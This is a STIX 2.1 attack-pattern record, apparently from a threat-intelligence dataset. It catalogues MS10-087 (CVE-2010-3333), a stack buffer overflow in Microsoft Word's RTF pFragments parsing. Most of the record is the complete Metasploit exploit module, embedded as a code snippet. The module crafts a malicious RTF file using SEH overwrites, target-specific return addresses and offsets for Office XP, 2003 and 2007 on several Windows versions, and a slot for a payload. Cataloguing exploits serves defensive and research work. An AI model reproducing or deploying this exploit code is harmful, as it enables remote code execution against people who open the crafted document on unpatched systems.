{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08e163da-2fc8-43ec-97d8-e04037254778",
    "created": "2024-08-14T16:36:17.015482Z",
    "modified": "2024-08-14T16:36:17.015486Z",
    "name": "MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)",
    "description": " This module exploits a stack-based buffer overflow in the handling of the 'pFragments' shape property within the Microsoft Word RTF parser. All versions of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the MS10-087 bulletin are vulnerable.  This module does not attempt to exploit the vulnerability via Microsoft Outlook.  The Microsoft Word RTF parser was only used by default in versions of Microsoft Word itself prior to Office 2007. With the release of Office 2007, Microsoft began using the Word RTF parser, by default, to handle rich-text messages within Outlook as well. It was possible to configure Outlook 2003 and earlier to use the Microsoft Word engine too, but it was not a default setting.  It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that Microsoft will confirm or deny this since Office 2000 has reached its support cycle end-of-life.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms10_087_rtf_pfragments_bof.rb",
            "external_id": "ms10_087_rtf_pfragments_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3333"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the handling of the\n        'pFragments' shape property within the Microsoft Word RTF parser. All versions\n        of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the\n        MS10-087 bulletin are vulnerable.\n\n        This module does not attempt to exploit the vulnerability via Microsoft Outlook.\n\n        The Microsoft Word RTF parser was only used by default in versions of Microsoft\n        Word itself prior to Office 2007. With the release of Office 2007, Microsoft\n        began using the Word RTF parser, by default, to handle rich-text messages within\n        Outlook as well. It was possible to configure Outlook 2003 and earlier to use\n        the Microsoft Word engine too, but it was not a default setting.\n\n        It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that\n        Microsoft will confirm or deny this since Office 2000 has reached its support\n        cycle end-of-life.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'wushi of team509',  # original discovery\n          'unknown',           # exploit found in the wild\n          'jduck',              # Metasploit module\n          'DJ Manila Ice, Vesh, CA' # more office 2007 for the lulz\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3333' ],\n          [ 'OSVDB', '69085' ],\n          [ 'MSB', 'MS10-087' ],\n          [ 'BID', '44652' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 512,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true # no need\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # This automatic target will combine all targets into one file :)\n          [ 'Automatic', { } ],\n\n          # Office v10.6854.6845, winword.exe v10.0.6854.0\n          [ 'Microsoft Office 2002 SP3 English on Windows XP SP3 English',\n            {\n              'Offsets' => [ 23532, 45944 ],\n              #'Ret' => 0x30002491 # p/p/r in winword.exe v10.0.6854.0\n              'Ret' => 0x30002309 # p/p/r in winword.exe v10.0.6866.0\n            }\n          ],\n\n          # Office v11.8307.8324, winword.exe v11.0.8307.0\n          # Office v11.8328.8221, winword.exe v11.0.8328.0\n          [ 'Microsoft Office 2003 SP3 English on Windows XP SP3 English',\n            {\n              'Offsets' => [ 24580, 51156 ],\n              'Ret' => 0x30001bdd # p/p/r in winword.exe\n            }\n          ],\n\n          # In order to exploit this bug on Office 2007, a SafeSEH bypass method is needed.\n\n          # Office v12.0.6425.1000, winword.exe v12.0.6425.1000\n          [ 'Microsoft Office 2007 SP0 English on Windows XP SP3 English',\n            {\n              'Offsets' => [ 5956 ],\n              'Ret' => 0x00290b0b # call ptr to ebp + 30, hits the next record\n            }\n          ],\n\n          [ 'Microsoft Office 2007 SP0 English on Windows Vista SP0 English',\n            {\n              'Offsets' => [ 5956 ],\n              'Ret' => 0x78812890 # p/p/r in msxml5.dll which wasn't opted into SafeSEH.  say word.\n            }\n          ],\n\n          [ 'Microsoft Office 2007 SP0 English on Windows 7 SP0 English',\n            {\n              'Offsets' => [ 5956 ],\n              'Ret' => 0x78812890 # p/p/r in msxml5.dll which wasn't opted into SafeSEH.  say word.\n            }\n          ],\n\n\n          # crash on a deref path to heaven.\n          [ 'Crash Target for Debugging',\n            {\n              'Offsets' => [ 65535 ],\n              'Ret' => 0xdac0ffee\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-11-09',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.rtf']),\n      ])\n  end\n\n  def add_target(rest, targ)\n    targ['Offsets'].each { |off|\n      seh = generate_seh_record(targ.ret)\n      rest[off, seh.length] = seh\n      distance = off + seh.length\n      jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n      rest[off + seh.length, jmp_back.length] = jmp_back\n    }\n  end\n\n  def exploit\n\n    # Prepare a sample SEH frame and backward jmp for length calculations\n    seh = generate_seh_record(0xdeadbeef)\n    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-0xffff\").encode_string\n\n    # RTF property Array parameters\n    el_size = sz_rand()\n    el_count = sz_rand()\n\n    data = ''\n    # These words are presumably incorrectly used\n    # assert(amount1 <= amount2)\n    data << [0x1111].pack('v') * 2\n    data << [0xc8ac].pack('v')\n\n    # Filler\n    if target.name =~ /Debug/i\n      rest = Rex::Text.pattern_create(0x10000 + seh.length + jmp_back.length)\n    else\n      len = 51200 + rand(1000)\n      rest = rand_text(len + seh.length + jmp_back.length)\n      rest[0, payload.encoded.length] = payload.encoded\n    end\n\n    # Stick fake SEH frames here and there ;)\n    if target.name == \"Automatic\"\n      targets.each { |t|\n        next if t.name !~ /Windows/i\n\n        add_target(rest, t)\n      }\n    else\n      add_target(rest, target)\n    end\n\n    # Craft the array for the property value\n    sploit = \"%d;%d;\" % [el_size, el_count]\n    sploit << data.unpack('H*').first\n    sploit << rest.unpack('H*').first\n\n    # Assemble it all into a nice RTF\n    content  = \"{\\\\rtf1\"\n    content << \"{\\\\shp\"             # shape\n    content << \"{\\\\sp\"              # shape property\n    content << \"{\\\\sn pFragments}\"  # property name\n    content << \"{\\\\sv #{sploit}}\"   # property value\n    content << \"}\"\n    content << \"}\"\n    content << \"}\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(content)\n\n  end\n\n  def sz_rand\n    bad_sizes = [ 0, 2, 4, 8 ]\n    x = rand(9)\n    while bad_sizes.include? x\n      x = rand(9)\n    end\n    x\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-09",
    "x_mitre_platforms": [
        "win'"
    ]
}